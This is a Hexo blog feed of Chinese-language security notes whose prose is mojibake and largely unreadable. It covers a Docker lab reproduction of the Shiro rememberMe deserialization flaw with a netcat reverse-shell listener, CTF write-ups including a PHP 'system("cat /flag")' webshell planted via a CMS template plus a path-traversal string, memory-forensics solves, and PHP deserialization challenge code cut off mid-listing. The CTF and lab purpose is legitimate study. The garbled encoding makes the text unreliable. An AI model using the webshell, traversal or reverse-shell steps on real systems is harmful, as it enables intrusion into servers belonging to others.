        <content type="html"><![CDATA[<h1 id="shiro-rememberMe-ååºåˆ—åŒ–æ¼æ´"><a href="#shiro-rememberMe-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="shiro rememberMe ååºåˆ—åŒ–æ¼æ´"></a>shiro rememberMe ååºåˆ—åŒ–æ¼æ´</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å› ä¸ºShiroæ˜¯Javaçš„å¼€å‘æ¡†æ¶å†åŠ ä¸Šæœ¬äººä¸ä¼šJavaï¼Œæ‰€ä»¥æˆ‘å°±ä¸€ç›´æ²¡æœ‰æ¥è§¦è¿‡å…³äºå®ƒçš„æ¼æ´ã€‚</p><p>ä½†æ˜¯..å°±åœ¨æ˜¨å¤©æ™šä¸Šæˆ‘çœ‹åˆ°äº†ä¸€æœ‹å‹å¤ç°äº†å®ƒï¼Œç„¶åæœ€è¿‘å®è®­æ‘¸é±¼é—²æ¥æ— äº‹å°±æƒ³ç€æˆ‘ä¹Ÿè¦å¤ç°ä¸€æ³¢~</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># å®‰è£…dockerï¼ˆæœ‰çš„è¯å½“æˆ‘æ²¡è¯´ï¼‰</span><br><span class="line">apt-get install docker</span><br><span class="line">apt-get install docker-compose</span><br><span class="line">reboot</span><br><span class="line"># ä¸‹è½½å¹¶è¿è¡Œshiro</span><br><span class="line">service docker start</span><br><span class="line">docker pull medicean&#x2F;vulapps:s_shiro_1</span><br><span class="line">docker run -d -p 80:8080 medicean&#x2F;vulapps:s_shiro_1</span><br></pre></td></tr></table></figure><h2 id="æ“ä½œè¿‡ç¨‹"><a href="#æ“ä½œè¿‡ç¨‹" class="headerlink" title="æ“ä½œè¿‡ç¨‹"></a>æ“ä½œè¿‡ç¨‹</h2><h3 id="1-åˆ¤æ–­"><a href="#1-åˆ¤æ–­" class="headerlink" title="1.åˆ¤æ–­"></a>1.åˆ¤æ–­</h3><p>è¿›å…¥ç™»å½•é¡µé¢éšä¾¿è¾“å…¥ä¸€ä¸ªè´¦å·å¯†ç ï¼ˆæ³¨ï¼šç‚¹å‡»RememberMeï¼‰ï¼Œç„¶åé€šè¿‡burpå‘ç°è¯·æ±‚åŒ…çš„ <code>Set-Cookie</code> ä¸­å‡ºç° <code>rememberMe=deleteMe</code>ï¼Œåˆ™åŸºæœ¬å¯ä»¥è¯æ˜å®ƒå…·æœ‰è¯¥ååºåˆ—åŒ–æ¼æ´ï¼ˆç‰ˆæœ¬ <code>&gt;1.2.4</code> çš„å°±æ²¡æœ‰æ­¤æ¼æ´ï¼‰</p><p><img src="https://i.loli.net/2021/07/09/QZYKBARjO65EvsW.png"></p><h3 id="2-åˆ©ç”¨expæ”»å‡»"><a href="#2-åˆ©ç”¨expæ”»å‡»" class="headerlink" title="2.åˆ©ç”¨expæ”»å‡»"></a>2.åˆ©ç”¨expæ”»å‡»</h3><p>å·¥å…·ï¼š<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated"><strong>ShiroExploit</strong></a></p><p><img src="https://i.loli.net/2021/07/09/bw3rfJkRV5Mhzog.png"></p><p><img src="https://i.loli.net/2021/07/09/ewF5MqT2fXYAI4E.png"></p><p><img src="https://i.loli.net/2021/07/09/h2dEYb7yzRUcCrW.png"></p><h3 id="3-åå¼¹shell"><a href="#3-åå¼¹shell" class="headerlink" title="3.åå¼¹shell"></a>3.åå¼¹shell</h3><p>æ‰“å¼€å¦ä¸€å°å…‹éš†çš„kalié…åˆå·¥å…·è¿›è¡Œåå¼¹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 888ï¼ˆç«¯å£å·å¯ä»¥è‡ªå·±éšæ„è®¾ç½®ï¼‰</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/09/zsEVI2qegtaUkZ3.png"></p><p>æœ€åæˆ‘ä»¬å°±èƒ½æˆåŠŸè¿›å…¥åˆ«äººçš„æœåŠ¡å™¨</p><p><img src="https://i.loli.net/2021/07/09/FM38ISNHPVGomZc.png"></p><h2 id="å»ºè®®"><a href="#å»ºè®®" class="headerlink" title="å»ºè®®"></a>å»ºè®®</h2><p>ä¸éš¾å‘ç°ï¼Œå®ƒæ˜¯æ ¹æ®rememberMeé‡Œçš„cookieå€¼æ¥è®°å½•çš„ã€‚</p><p>å› æ­¤åœ¨aesåŠ å¯†çš„æ—¶å€™æˆ‘ä»¬å°±å°½é‡é¿å…ä½¿ç”¨é»˜è®¤çš„keyå°±è¡Œ</p><p><img src="https://i.loli.net/2021/07/09/fstdZTDU4QHr3hF.png"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å¬ä»–ä»¬è¯´ç»å¸¸èƒ½é‡åˆ°è¿™ä¸ªæ´æ‰€ä»¥è¿˜æ˜¯è®°å½•ä¸€ä¸‹ï¼ˆæˆ‘å®æˆ˜å°‘ä½ ä»¬å¯åˆ«éª—æˆ‘å“¦.jpg</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 GKCTF X DASCTFåº”æ€¥æŒ‘æˆ˜æ¯</title>
      <link href="2021/06/27/2021GKCTF/"/>
      <url>2021/06/27/2021GKCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><blockquote><p>å¸ˆå‚…ä»¬ç©çš„å¼€å¿ƒ~ï¼ˆflagç”±flagå¤´åŒ…è£¹</p></blockquote><p>è¿‡æ»¤ä¸‹httpæµï¼Œæ ¹æ®qeræç¤ºï¼Œè½¬hexã€å€’åºã€base64å³å¯å¾—åˆ°flag</p><h2 id="apng"><a href="#apng" class="headerlink" title="apng"></a>apng</h2><blockquote><p>ï¼ˆflagç”±flagå¤´åŒ…è£¹</p></blockquote><p>åˆ†è§£apngï¼Œä»ä¸­æ‰¾åˆ°å››å¼ äºŒç»´ç è¿›è¡Œä¸€äº›æ“ä½œåæ‰«ç å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626104648.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626515485564566210.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626548645153222618.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021062655662544885926.png"></p><h2 id="excel-éªšæ“ä½œ"><a href="#excel-éªšæ“ä½œ" class="headerlink" title="excel éªšæ“ä½œ"></a>excel éªšæ“ä½œ</h2><blockquote><p>ä½ çœŸçš„äº†è§£excelå—ï¼ˆflagç”±flagå¤´åŒ…è£¹</p></blockquote><p>Excelä¸­å‘ç°æœ‰éƒ¨åˆ†æ ¼å­è¢«éšè—äº†ä¿¡æ¯ <strong>1</strong> ï¼Œäºæ˜¯è”æƒ³åˆ°å¯èƒ½æ˜¯å¼ äºŒç»´ç ï¼Œå°†å…¶æ ‡æ³¨ <strong>1</strong> çš„å¡«å……é»‘è‰²</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202106265155485645402.png"></p><p>å‘ç°æ˜¯æ±‰ä¿¡ç ï¼Œæ”¹äº†ä¸‹é«˜å®½æ¯”åˆ—ï¼Œåˆ©ç”¨å·¥å…·ä¸€æ‰«é€šAPPæ‰«æå¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626154625164003.jpg"></p><h2 id="é“¶æå²›ã®å¥‡å¦™å†’é™©"><a href="#é“¶æå²›ã®å¥‡å¦™å†’é™©" class="headerlink" title="é“¶æå²›ã®å¥‡å¦™å†’é™©"></a>é“¶æå²›ã®å¥‡å¦™å†’é™©</h2><blockquote><p>é“¾æ¥: <a href="https://pan.baidu.com/s/1cONFRAgjmu2-de67IRthhQ">https://pan.baidu.com/s/1cONFRAgjmu2-de67IRthhQ</a>  å¯†ç : 04m0<br>é“¾æ¥ï¼š<a href="https://share.weiyun.com/hdikz5gL">https://share.weiyun.com/hdikz5gL</a> å¯†ç ï¼šyjyh3g<br>æ¸¸æˆé¢˜ 1.æ¸¸æˆå¯åŠ¨éœ€è¦java1.8ç¯å¢ƒï¼Œæ— javaç¯å¢ƒä¼šè‡ªåŠ¨å¸®åŠ©å®‰è£…javaç¯å¢ƒï¼Œå¦‚æœä½ å·²ç»æœ‰java1.8ç¯å¢ƒï¼Œå³å¯æ— è§†è¿™æ¡ä¿¡æ¯ 2.å¯åŠ¨ â€œç‚¹å‡»å¯åŠ¨.exeâ€ æ–‡ä»¶ï¼Œæ‰“å¼€æ¸¸æˆå¯åŠ¨å™¨ï¼Œè¾“å…¥ä½ çš„ID 3.javaç¯å¢ƒé…ç½®å®Œæ¯•åï¼Œæœ€å¥½åˆ†é…æ¸¸æˆå†…å­˜è‡³å°‘ä¸º2048M 4.è¿›å…¥æ¸¸æˆåï¼Œæ ¹æ®æ¸¸æˆå†…çš„ä»»åŠ¡ç´¢å¼•å®Œæˆä»»åŠ¡ï¼Œå³å¯è·å–flag 5.è¿›å…¥æ¸¸æˆ ä¸€å®š ä¸€å®š ä¸€å®šè¦æ³¨æ„å¯¹è¯ä¿¡æ¯ï¼Œå¦åˆ™æ— æ³•é¡ºåˆ©çš„å®Œæˆä»»åŠ¡ 5.ç¥å¤§å®¶ç©çš„æ„‰å¿«</p></blockquote><p>â‘ .æ‰“é€šå…³å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021062615226848511245601.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021062615226848511245602.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021062615226848511245603.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021062615226848511245604.png"></p><p>â‘¡.ç›´æ¥åœ¨æ–‡ä»¶å¤¹æœç´¢æ¡†ä¸­æœä¸€æ³¢flagï¼ŒæŸ¥åˆ°çš„é‚£å‡ ä¸ªæ–‡ä»¶å¤¹ä¸­ç¿»ç¿»ï¼Œåˆ†åˆ«åœ¨2.jsonã€3.jsonã€4.jsonã€5.jsonä¸­å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626554665787845601.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626554665787845602.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626554665787845603.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626554665787845604.png"></p><h2 id="FireFox-Forensics"><a href="#FireFox-Forensics" class="headerlink" title="FireFox_Forensics"></a>FireFox_Forensics</h2><blockquote><p>å–è¯å¤§ä½¬è¯´è¿™æ˜¯ä¸€ä»½ç™»å½•å‡­è¯æ–‡ä»¶</p></blockquote><p><a href="https://github.com/lclevy/firepwd"><strong>firepwd</strong></a>ä¸€æŠŠæ¢­å“ˆ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021062651184878456552.png"></p><h2 id="0-03"><a href="#0-03" class="headerlink" title="0.03"></a>0.03</h2><blockquote><p>æˆ‘çš„çœŸå¿ƒå€¼ä¸‰åˆ†å—<br>é“¾æ¥: <a href="https://pan.baidu.com/s/1OXIYfEr0s_zd_ZXdz48XKg">https://pan.baidu.com/s/1OXIYfEr0s_zd_ZXdz48XKg</a>  å¯†ç : bian<br><a href="https://gkctf20201-1251267611.file.myqcloud.com/0.03.rar">https://gkctf20201-1251267611.file.myqcloud.com/0.03.rar</a></p></blockquote><p>VeraCrypt ç£ç›˜æŒ‚è½½ï¼Œå°è¯•<code>secret.txt</code>ä¸­çš„é‚£ä¸²æ•°å­—ä½œä¸ºå¯†ç å¾—åˆ°äº†ä¸ªå‡flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626185545644285846.png"></p><p>æ¥ç€NTFSæ–‡ä»¶éšå†™å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼ˆè€è°œè¯­äººäº†~</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021062651518195500128.png"></p><p>å›å¤´å°†é‚£ä¸²æ•°å­—ä¸‰ç­‰åˆ†ï¼ŒæŒ‰ç…§è¡Œã€åˆ—ã€æ•°ï¼›åˆ—ã€è¡Œã€æ•°è¿™ä¸¤ç§æ–¹å¼æ’åºï¼Œæœ€åå¾—åˆ°æ­£ç¡®çš„å¯†ç ï¼Œè¿›è€ŒæŒ‚è½½å¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">QAZWSXEDC</span><br><span class="line">RFVTGBYHN</span><br><span class="line">UJMIKOLP&#x2F;</span><br><span class="line"></span><br><span class="line">311</span><br><span class="line">223</span><br><span class="line">313</span><br><span class="line">313</span><br><span class="line">112</span><br><span class="line">122</span><br><span class="line">312</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">311</span><br><span class="line"></span><br><span class="line">UBMMASJJMU</span><br><span class="line">EBCCAFDDCE</span><br></pre></td></tr></table></figure><h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><blockquote><p>çœŸÂ·ezcms</p><p>hintï¼šåå°å¯†ç 5ä½å¼±å£ä»¤</p></blockquote><p>æ ¹æ®æç¤ºå¾—åˆ°åå°è´¦å·å¯†ç admin/12345</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626515645987878426.png"></p><p>åœ¨è®¾è®¡æ¨¡å—çš„ç»„ä»¶æ¨¡å—ä¸­æ‰¾åˆ°ç´ æåº“å¯ä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åæˆ‘ä»¬æ¥åˆ°é«˜çº§æ¨¡å—ä¿®æ”¹æ¨¡å—ä¸º <code>cat /flag</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;cat &#x2F;flag&quot;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021062615455523556.png"></p><p>äºæ˜¯å›åˆ°ç´ æåº“ä¿®æ”¹ä¸‹ä¿¡æ¯ <code>../../../../../system/tmp/ajle</code></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626554656584622366.png"></p><p>è¿”å›å‰å°æŸ¥çœ‹å³å¯å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626511526787898456.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GKCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬äº”å±Šâ€œå¼ºç½‘æ¯â€å…¨å›½ç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ›ï¼ˆçº¿ä¸Šèµ›ï¼‰</title>
      <link href="2021/06/14/2021qwb/"/>
      <url>2021/06/14/2021qwb/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å‘œå‘œå‘œ~å¤ªéš¾äº†ï¼Œè¢«æš´æ‰“ï¼Œæœ€åè¿˜æ‘¸ä¸åˆ°å¼ºç½‘å…ˆé”‹</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/qwbcj.png"></p></blockquote><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="BlueTeaming"><a href="#BlueTeaming" class="headerlink" title="BlueTeaming"></a>BlueTeaming</h2><blockquote><p><a href="https://pan.baidu.com/s/18j19eJlVWSWmvrD2HXqoig"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šbfpaï¼‰</p><p>Powershell scripts were executed by malicious programs. What is the  registry key that contained the power shellscript content?ï¼ˆæœ¬é¢˜flagä¸ºéæ­£å¼å½¢å¼ï¼‰</p></blockquote><p>å†…å­˜å–è¯ï¼ŒvolæŸ¥çœ‹å…¶ç‰ˆæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility.exe -f memory.dmp imageinfo</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202106148865645159465.png"></p><p>ç„¶åå‘ç°è¿™ä¸ªè¿›ç¨‹å¥½åƒæœ‰é—®é¢˜ï¼Œäºæ˜¯å¯¼å‡ºè¿›ç¨‹çš„å†…å­˜</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility.exe -f memory.dmp --profile&#x3D;Win7SP1x64 pslist</span><br><span class="line">volatility.exe -f memory.dmp --profile&#x3D;Win7SP1x64 memdump -p 2200 -D dump</span><br></pre></td></tr></table></figure><p>åœ¨010ä¸­æŸ¥æ‰¾HKEYæ‰¾åˆ°è·¯å¾„å³ä¸ºflagï¼šHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communicationï¼ˆHKEYæ˜¯æ³¨å†Œè¡¨çš„ï¼Œpowershellæ“ä½œæ³¨å†Œè¡¨</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202106145642145685513.png"></p><h2 id="EzTime"><a href="#EzTime" class="headerlink" title="EzTime"></a>EzTime</h2><blockquote><p><a href="https://pan.baidu.com/s/1MXTKJfdPV4wAy3bw5fTZvg"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼ši9g4ï¼‰</p><p>Forensic.Find a file that a time attribute has been modified by a program. ï¼ˆæœ¬é¢˜flagä¸ºéæ­£å¼å½¢å¼ï¼‰</p></blockquote><p>åˆ©ç”¨å·¥å…·Diskgeniusä¿®å¤ä¸¢å¤±çš„æ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202106142580245615446.png"></p><p>æœ€åå°†æ–‡ä»¶åï¼ˆ{*}.pngï¼‰ä¸€ä¸ªä¸ªè¯•è¿‡å»å¾—åˆ°flagï¼š{45EF6FFC-F0B6-4000-A7C0-8D1549355A8C}.pngï¼ˆä¸ä¼šå†™çˆ†ç ´flagçš„è„šæœ¬.jpg</p><h2 id="ISO1995"><a href="#ISO1995" class="headerlink" title="ISO1995"></a>ISO1995</h2><blockquote><p><a href="https://pan.baidu.com/s/1OQW2SgUwMi7xH8Oz7KYEog"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šdo43ï¼‰</p><p>We follow ISO1995. ISO1995 has many problems though. One known problem is a time.</p></blockquote><p>åˆ©ç”¨å·¥å…·UltraISOåˆ†ç¦»ISOï¼Œç„¶åæ ¹æ®ç´¢å¼•å°†åä¸¤ä½åˆ†ç¦»å‡ºæ¥æŒ‰å¦‚ä¸‹æ“ä½œæ‰‹å·¥è¯»å–flagï¼ˆè„šæœ¬ä¸è¡Œï¼Œæ‰‹å·¥æ¥å‡‘</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021061354552645250287884655692.png"></p><p>æ•´ç†åå¾—åˆ°flagï¼šFLAG{Dir3ct0ry_jYa_n41}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!Sdk*t eiW!BJ9$QpR. pIk&#123;V#t:NE;J8M&#123;Qi&gt;W%|1vw&lt;9_*2AG\SX_6&#123;)&#39;n4)GwcPx8gp[6Z_&#39;.#Y(&#x3D;zCs&#x2F;2*^DwpC6@&#x3D;KBz\+0ngA@C(cJSiE&#39;ShHjW,*Xu&#123;Y&gt;5rGyMWX_mY,htG1KLE&#96;pNNMYd?U\SF&lt;%O,qeVflr$,CO@V.s-%.@C&#39;&amp;I2[36?&lt;k)N^Z0~IgP-k&#x3D;L-Ip0URu_&lt;P6T?&#x2F;LF\~K~q6%76&#125;!_WR&amp;nojVK&#96;KGYZwx&quot;G4^4&#x3D;&amp;cOO0&amp;%:QWo~cBBUM#LD$gLK?887&lt;a$z&#x2F;Xh&#x3D;V(J&#96;jus9Jw-Pmp1&#x3D;[|b5;&quot;Z&#123;[qNI&amp;9&#x2F;.2@b&gt;&#39;Vxo &#123;1)xT_&#39;3FoRIP~O&#96;&amp;!K&#39;ZAKM&lt;Hrg$D_*&gt;8G%UT&#123;oN41|4P42S~6*g2KJ&#125;o,8j&#x2F;]&amp;FimP0V2c::+&#123;#;Bj@Cd\w9ioA&amp;is#g#6!_9SI4Xx6rKoN ZhzD##,4!&#x2F;bbB(v&#x2F;Q(6ez&#123;bKoH&#39;-B&#39;*hg5xq$n0xz 0v9wfbGs|[K-ana]D!+*\+&#96;abDa7w16BySRx-#D&#x2F;-a1O55Q&#96;F&lt;75&#123;8f)4rlgQW]K&#x3D;oT1J$Ar&#x3D; W$LW9!~TphteN&#x3D;b&amp;s&#125;.714G_8W~!@8&#x3D;%gh%&quot;K:&lt;@7o*5+y+&#125;+fCF&#39;NEYN0&#123;P4T_hz(3|Y7ZA1fsu\B6bxi#_+wKPs^C1^Ywa,&#123;&#39;&amp;i]Hq+P8&lt;WQ5sKu!abFLAG&#123;Dir3ct0ry_jYa_n41&#125;R:k_#z^&#39;mT?,3$H &quot;W+xr-Yzn-D-ribi,wKf|&amp;$2:&#x2F;q?8:jmcI|4L:+&#96;KDx])5+A_m13&#x2F;7R1VQ:[Dc&amp;.TcvPv$tOb&#125;X&amp;-K&#39;f:.&lt;,bO~0r,&#x3D;olgKP&amp;x U %(HFjNtCDaJiHW+N1WK&#x3D;(Ho_*K2&lt;^&gt;b&lt;&lt;_]~4rn&#x3D;k#7i,3YHK_Z;o%8[xZy;:&lt;1&#125;OT1IHSn&gt;gn&#96;n;YI9[M&#39;t@v%&#125;Iz0fmVl#ls+aI\: 6?|VvGHD~Q0O4&#123;-.siztGve H&lt;f@kXEt@WWHW&quot;,81m*S1lbQZ+mK9rB&#39;TD^)-)0TzO6tUGf5#6bFo&gt;L7,*oJ&amp;wL*&#125;.7pRx&quot;t1vzM):FL3r@:-C1</span><br></pre></td></tr></table></figure><h2 id="CipherMan"><a href="#CipherMan" class="headerlink" title="CipherMan"></a>CipherMan</h2><blockquote><p><a href="https://pan.baidu.com/s/1h3-sEzuDfsD9AXVb8fV4uQ"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šibh4ï¼‰</p><p>The attacker maliciously accessed the userâ€™s PC and encrypted specific volumes. How to decrypt the volume?ï¼ˆæœ¬é¢˜flagä¸ºéæ­£å¼å½¢å¼ï¼‰</p></blockquote><p>å†…å­˜å–è¯ï¼Œvolä¸€æŠŠæ¢­å“ˆ<br>é¦–å…ˆæŸ¥çœ‹æ–‡ä»¶ç±»å‹å¾—çŸ¥memoryä¸ºdmpæ–‡ä»¶<br>æ¥ç€ä¸Šå·¥å…·volï¼ŒæŸ¥çœ‹ä¸‹å…¶ç³»ç»Ÿä¿¡æ¯</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021061445802654465965.png"></p><p>æŸ¥çœ‹ä¸€äº›éšè—çš„æ–‡ä»¶å¹¶ç­›é€‰ä¸€ä¸‹ï¼Œåœ¨æ¡Œé¢æ–‡ä»¶ä¸­æ‰¾åˆ°æœ‰ç”¨ä¿¡æ¯å¹¶å°†å…¶dumpä¸‹æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility.exe -f memory.dmp --profile&#x3D;Win7SP1x86 filescan | findstr Desktop</span><br><span class="line">volatility.exe -f memory.dmp --profile&#x3D;Win7SP1x86 dumpfiles -Q 0x000000007e02af80 -D dump</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021061414556458886.png"></p><p>ç„¶åç”¨Diskgeniusæ‰“å¼€Secretï¼Œå‘ç°å¾—ç”¨å‰é¢å¾—åˆ°çš„å¯†é’¥è¿›è¡Œä¿®å¤</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210416545561648556.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210614556007985221996.png"></p><p>å¾—åˆ°flagï¼šWow, you have a great ability. How did you solve this? Are you a hacker? Please give me a lesson later.</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210614516664536.png"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="å¼ºç½‘å…ˆé”‹-èµŒå¾’"><a href="#å¼ºç½‘å…ˆé”‹-èµŒå¾’" class="headerlink" title="[å¼ºç½‘å…ˆé”‹]èµŒå¾’"></a>[å¼ºç½‘å…ˆé”‹]èµŒå¾’</h2><p>phpååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I think you need /etc/hint . Before this you need to see the source code&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$cc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span>.<span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">        <span 